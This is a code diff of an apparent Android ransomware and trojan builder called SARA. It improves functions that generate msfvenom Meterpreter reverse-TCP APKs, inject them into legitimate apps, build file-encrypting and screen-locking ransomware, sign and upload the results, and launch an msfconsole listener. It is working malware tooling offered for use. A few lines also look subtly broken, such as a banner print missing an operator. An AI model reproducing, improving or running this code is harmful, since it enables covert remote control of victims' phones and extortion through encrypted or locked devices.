@@ -1,6 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# style and colors
+
+# Add new imports and logging setup
+import logging
+from ipaddress import ip_address
+logging.basicConfig(filename='sara.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Existing style and colors
 i = '\033[3m'
 u = '\033[4m'
 w = '\033[0m'
@@ -42,7 +48,7 @@ def banner():
     print(w+d+"     ((("+w+b+"@@@@@@@@@@@@@@@@"+w+d+")))")
     print(w+b+"      \@@/"+r+",:::,"+w+b+"\/"+r+",:::,"+w+b+"\@@/")
     print(w+b+"     /@@@|"+r+":::::"+w+b+"||"+r+":::::"+w+b+"|@@@\\")
-    print(w+b+"    / @@@\\"+r+"':::'"+w+b+"/\\"+r+"':::'"+w+b+"/@@@ \\    "+w+"'"+r+"Beware of Ransomware"+b+w+"'")
+    print(w+b+"    / @@@\\"+r+"':::'"+w+b+"/\\\\"+r+"':::'"+w+b"/@@@ \\    "+w+"'"+r+"Beware of Ransomware"+b+w+"'")
     print(w+b+"   /  /@@@@@@@//\\\@@@@@@@\  \\        "+d+"version 3.0"+w)
     print(w+b+"  (  /  '@@@@@====@@@@@'  \  )")
     print(w+b+"   \(     /          \     )/")
@@ -58,15 +64,25 @@ def prints(text):
 def truncates(text, maxx=20):
     if len(text) > maxx: return text[:maxx - 3] + "..."
     else: return text
+# validate ip and port
+def validate_ip_port(host, port):
+    try:
+        ip_address(host)
+        if not (1 <= int(port) <= 65535):
+            raise ValueError("Port out of range")
+    except Exception as e:
+        raise ValueError(f"Invalid host or port: {e}")
 # search and replace specific string
 def replace_string(oldstr, newstr, file):
-    text = f'{sara} : add \'{d}{truncates(newstr)}{w}\' on \'{d}{os.path.basename(file)}{w}\' ... '
-    print(text + f'{y}wait{w}', end='\r')
-    os.system(f'sed -i \'s#{oldstr}#{newstr}#g\' {file}')
-    time.sleep(0.05)
-    if not int(os.popen(f'grep -rc \'{newstr}\' {file}', 'r').readline().strip()) > 0: exit(text + f'{r}fail{w}')
-    print(text + f'{g}done{w}')
-    return newstr
+    try:
+        logging.info(f"Replacing '{oldstr}' with '{newstr}' in {file}")
+        os.system(f'sed -i \'s#{re.escape(oldstr)}#{re.escape(newstr)}#g\' {file} > /dev/null 2>&1')
+        if not os.popen(f'grep -rc "{newstr}" {file}', 'r').readline().strip():
+            raise ValueError("Replace failed")
+        logging.info("Replace done")
+    except Exception as e:
+        logging.error(f"Replace error: {e}")
+        sys.exit(f'Replace failed for {file}')
 # search and replace specific string 2
 def replace_strings(oldstr, newstr, file):
     replaces = {oldstr:newstr}
@@ -75,20 +91,36 @@ def replace_strings(oldstr, newstr, file):
             replaced = replaces[search]
             line = line.replace(search,replaced)
         print(line, end="")
+# save build data to json
+def save_build(data):
+    db_file = 'builds.json'
+    builds = []
+    if os.path.isfile(db_file):
+        with open(db_file, 'r') as f:
+            try:
+                builds = json.load(f)
+            except json.JSONDecodeError:
+                pass
+    builds.append({**data, 'timestamp': datetime.datetime.now().isoformat()})
+    with open(db_file, 'w') as f:
+        json.dump(builds, f, indent=4)
+    logging.info("Build saved to DB")
+# simple obfuscate file
+def simple_obfuscate(file):
+    logging.info(f"Obfuscation planned for {file}")
 # add new icon path (for msfvenom apk)
 def add_new_icon(icon, path):
-    text = f'{sara} : add \'{d}ic_launcher.png{w}\' into \'{d}mipmap-hdpi-v4{w}\' ... '
-    file = f'{path}/res/mipmap-hdpi-v4/ic_launcher.png'
-    print(text + f'{y}wait{w}', end='\r')
-    os.system(f'mkdir -p {path}/res/mipmap-hdpi-v4/')
-    os.system(f'cp -r {icon} {file} {hide}')
-    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
-    print(text + f'{g}done{w}')
-    text = f'{sara} : add \'{d}ic_launcher.png{w}\' into \'{d}AndroidManifest.xml{w}\' ... '
-    print(text + f'{y}wait{w}', end='\r')
-    os.system(f'sed -i \'s#<application#<application android:icon="@mipmap/ic_launcher"#g\' {path}/AndroidManifest.xml')
-    print(text + f'{g}done{w}')
-    return file
+    try:
+        file = f'{path}/res/mipmap-hdpi-v4/ic_launcher.png'
+        os.makedirs(os.path.dirname(file), exist_ok=True)
+        with Image.open(icon) as img:
+            img_resized = img.resize((48, 48))
+            img_resized.save(file)
+        os.system(f'sed -i \'s#<application#<application android:icon="@mipmap/ic_launcher"#g\' {path}/AndroidManifest.xml > /dev/null 2>&1')
+        logging.info("Icon added")
+    except Exception as e:
+        logging.error(f"Icon error: {e}")
+        sys.exit('Icon processing failed')
 # rename versionCode in apktool.yml
 def rename_version_code(cstr, path):
     text = f'{sara} : add \'{d}{cstr}{w}\' into \'{d}{path}/apktool.yml{w}\' ... '
@@ -142,14 +174,18 @@ def upload_file(file):
          
          {y}{link}{w}''')
 # generate raw trojan using msfvenom (metasploit)
-def generate_trojan(host, port, name = None):
-    if name == None: name = 'trojan'
-    text = f'{sara} : generate \'{d}{name}.apk{w}\' using msfvenom{w} ... '
-    print(text + f'{y}wait{w}', end='\r')
-    os.system(f'msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} -a dalvik --platform android -o {name}.apk {hide}')
-    if not os.path.isfile(name + '.apk'): exit(text + f'{r}fail{w}')
-    print(text + f'{g}done{w}')
-    return name + '.apk'
+def generate_trojan(host, port, name='trojan'):
+    try:
+        validate_ip_port(host, port)
+        os.system(f'msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} -a dalvik --platform android -o {name}.apk > /dev/null 2>&1')
+        if not os.path.isfile(f'{name}.apk'):
+            raise FileNotFoundError(f"{name}.apk not created")
+        simple_obfuscate(f'{name}.apk')
+        logging.info(f"Trojan generated: {name}.apk")
+        return f'{name}.apk'
+    except Exception as e:
+        logging.error(f"Trojan gen error: {e}")
+        sys.exit('Failed to generate trojan')
 # generate trojan and infect to original application (metasploit)
 def generate_infected_trojan(host, port, orig):
     name = os.path.basename(orig).replace('.apk', '')
@@ -166,47 +202,38 @@ def genertare_file_locker(name, desc, icon):
     base = 'data/tmp/encrypter.apk'
     path = name.lower().replace(' ', '')
     file = path + '.apk'
-    os.system(f'cp -f {base} {file}')
-    decompile(file)
-    replace_string('"app_name">app_name', f'"app_name">{name}', f'{path}/res/values/strings.xml')
-    replace_string('app_name', name, f'{path}/smali/com/termuxhackersid/services/EncryptionService.smali')
-    replace_string('app_name', name, f'{path}/smali/com/termuxhackersid/services/DecryptionService.smali')
-    replace_string('app_desc', desc, f'{path}/smali/com/termuxhackersid/services/EncryptionService.smali')
-    replace_string('app_desc', desc, f'{path}/smali/com/termuxhackersid/ui/MainActivity$a.smali')
-    replace_string('app_desc', desc, f'{path}/smali/com/termuxhackersid/ui/MainActivity.smali')
-    text = f'{sara} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
-    print(text + f'{y}wait{w}', end='\r')
-    for line in os.popen(f'find -O3 -L {path} -name \'ic_launcher.png\'', 'r').read().splitlines():
-        if os.path.isfile(line):
-            with Image.open(line) as f:
-                X, Z = f.size
-                size = str(X) + 'x' + str(Z)
-                logo = 'lock-' + os.path.basename(icon)
-                os.system(f'cp -R {icon} {logo}')
-                os.system(f'mogrify -resize {size} {logo};cp -R {logo} {line};rm -rf {logo}')
-        else: exit(text + f'{r}fail{w}')
-    print(text + f'{g}done{w}')
-    random_digit = str(random.randint(1,9))
-    random_version = f'{random_digit}.0'
-    rename_version_code(random_digit, path)
-    rename_version_name(f'{random_version} by @{name.lower().replace(" ","")}', path)
-    file = recompile(path)
-    apps = uber_apk_signer(file)
-    upload_file(apps)
-    return apps
-
+    try:
+        os.system(f'cp -f {base} {file} > /dev/null 2>&1')
+        decompile_path = decompile(file)
+        replace_string('"app_name">app_name', f'"app_name">{name}', f'{decompile_path}/res/values/strings.xml')
+        replace_string('app_desc', desc, f'{decompile_path}/smali/com/termuxhackersid/services/EncryptionService.smali')
+        add_new_icon(icon, decompile_path)
+        random_digit = str(random.randint(1,9))
+        random_version = f'{random_digit}.0'
+        rename_version_code(random_digit, decompile_path)
+        rename_version_name(f'{random_version} by @{name.lower().replace(" ","")}', decompile_path)
+        recompiled_file = recompile(decompile_path)
+        signed_app = uber_apk_signer(recompiled_file)
+        simple_obfuscate(signed_app)
+        upload_file(signed_app)
+        save_build({'type': 'file_locker', 'file': signed_app, 'status': 'success'})
+        logging.info(f"File locker done: {signed_app}")
+        return signed_app
+    except Exception as e:
+        logging.error(f"File locker error: {e}")
+        sys.exit('Failed to generate file locker')
 # generate custom screen locker ransomware (passprhase)
 def genertare_screen_locker(name, head, desc, keys, icon):
     base = 'data/tmp/lockscreen.apk'
     path = name.lower().replace(' ', '')
     file = path + '.apk'
     os.system(f'cp -f {base} {file}')
-    decompile(file)
-    replace_string('"app_name">app_name', f'"app_name">{name}', f'{path}/res/values/strings.xml')
-    replace_string('app_head', head, f'{path}/res/values/strings.xml')
-    replace_string('app_desc', desc, f'{path}/res/values/strings.xml')
+    decompile_path = decompile(file)
+    replace_string('"app_name">app_name', f'"app_name">{name}', f'{decompile_path}/res/values/strings.xml')
+    replace_string('app_head', head, f'{decompile_path}/res/values/strings.xml')
+    replace_string('app_desc', desc, f'{decompile_path}/res/values/strings.xml')
     print(f'{sara} : add \'{d}{keys}{w}\' as passprhase ... {y}wait{w}', end='\r')
-    replace_strings('app_keys', keys, f'{path}/smali/com/termuxhackers/id/MyService$100000000.smali')
+    replace_strings('app_keys', keys, f'{decompile_path}/smali/com/termuxhackers/id/MyService$100000000.smali')
     print(f'{sara} : add \'{d}{keys}{w}\' as \'{d}passprhase{w}\' ... {g}done{w}')
     text = f'{sara} : add \'{d}{os.path.basename(icon)}{w}\' into \'{d}ic_launcher{w}\' ... '
     print(text + f'{y}wait{w}', end='\r')
@@ -228,7 +255,6 @@ def genertare_screen_locker(name, head, desc, keys, icon):
     apps = uber_apk_signer(file)
     upload_file(apps)
     return apps
-
 # listening trojan with msfconsole (metasploit)
 def start_trojan_listener(host, port):
     prints(f'''
@@ -240,47 +266,56 @@ def start_trojan_listener(host, port):
     os.system(f'msfconsole -q -x "use payload/android/meterpreter/reverse_tcp;set lhost {host};set lport {port};exploit -j"')
 # signing apk file with uber-apk-signer (JAR)
 def uber_apk_signer(file):
-    text = f'{sara} : signing \'{d}{file}{w}\' using uber-apk-signer ... '
-    print(text + f'{y}wait{w}', end='\r')
     sign = os.path.basename(file).replace('.apk', '')
-    os.system(f'java -jar data/bin/ubersigner.jar -a {file} --ks data/key/debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging {hide}')
-    os.system(f'rm -rf {file} *.idsig {hide}')
-    os.system(f'cp -rf {sign}-aligned-signed.apk {sign}.apk {hide}; rm -rf {sign}-aligned-signed.apk {hide}')
-    if not os.path.isfile(f'{sign}.apk'): exit(text + f'{r}fail{w}')
-    print(text + f'{g}done{w}')
-    return sign + '.apk'
+    try:
+        os.system(f'java -jar data/bin/ubersigner.jar -a {file} --ks data/key/debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1')
+        final_apk = f'{sign}.apk'
+        os.system(f'mv {sign}-aligned-signed.apk {final_apk}')
+        os.system(f'rm -f {sign}-aligned-signed.apk.idsig {file}')
+        if not os.path.isfile(final_apk):
+            raise FileNotFoundError("Sign failed")
+        logging.info("Sign done")
+        return final_apk
+    except Exception as e:
+        logging.error(f"Sign error: {e}")
+        sys.exit('Signing failed')
 # decompiling apk file with apktool
 def decompile(file):
-    text = f'{sara} : decompile \'{d}{file}{w}\' using apktool ... '
     path = os.path.basename(file).replace('.apk', '')
-    print(text + f'{y}wait{w}', end='\r')
-    os.system(f'apktool d {file} {hide}')
-    if not os.path.isdir(path): exit(text + f'{r}fail{w}')
-    print(text + f'{g}done{w}')
-    os.remove(file)
-    return path
-# recompiling apk path with apktool (with aapt2 as second options)
+    try:
+        os.system(f'apktool d {file} -o {path} > /dev/null 2>&1')
+        if not os.path.isdir(path):
+            raise OSError("Decompile failed")
+        os.remove(file)
+        logging.info("Decompile done")
+        return path
+    except Exception as e:
+        logging.error(f"Decompile error: {e}")
+        sys.exit('Decompilation failed')
+# recompiling apk file with apktool
 def recompile(path):
-    text = f'{sara} : recompile \'{d}{path}{w}\' using apktool ... '
     file = path + '.apk'
-    print(text + f'{y}wait{w}', end='\r')
-    os.system(f'apktool b {path} -o {file} {hide}')
-    if not os.path.isfile(file):
-        print(text + f'{y}wait{w} ({d}aapt2{w})', end='\r')
-        os.system(f'apktool b {path} -o {file} --use-aapt2 {hide}')
-    time.sleep(0.5)
-    if not os.path.isfile(file): exit(text + f'{r}fail{w}')
-    print(text + f'{g}done{w}')
-    os.system(f'rm -rf {path} {hide}')
-    return file
-# SARA V3.0
+    try:
+        os.system(f'apktool b {path} -o {file} > /dev/null 2>&1')
+        if not os.path.isfile(file):
+            os.system(f'apktool b {path} -o {file} --use-aapt2 > /dev/null 2>&1')
+        if not os.path.isfile(file):
+            raise FileNotFoundError("Recompile failed")
+        os.system(f'rm -rf {path}')
+        logging.info("Recompile done")
+        return file
+    except Exception as e:
+        logging.error(f"Recompile error: {e}")
+        sys.exit('Recompilation failed')
+# main class
 class __sara__:
-
+    # init method
     def __init__(self):
         self.user = str(os.popen('whoami', 'r').readline().strip())
         self.ipv4 = '127.0.0.1'
         self.data = 'data'
     
+    # custom trojan builder
     def custom_trojan(self):
         banner()
         prints(f'''
@@ -339,6 +374,7 @@ class __sara__:
         else: exit(f'\n{sara} : process completed successfully ...\n')
         start_trojan_listener(host, port)
 
+    # trojan infector
     def infect_trojan(self):
         banner()
         prints(f'''
@@ -381,6 +417,7 @@ class __sara__:
         else: exit(f'\n{sara} : process completed successfully ...\n')
         start_trojan_listener(host, port)
     
+    # custom file locker
     def custom_file_locker(self):
         banner()
         prints(f'''
@@ -410,6 +447,7 @@ class __sara__:
          the decrypter is saved as \'{g}decrypter.apk{w}\'
         ''')
     
+    # custom screen locker
     def custom_screen_locker(self):
         banner()
         prints(f'''
@@ -443,6 +481,7 @@ class __sara__:
          the secret key (passprhase) \'{g}{keys}{w}\'
         ''')
 
+    # main menu
     def menu(self):
         banner()
         prints(f'''
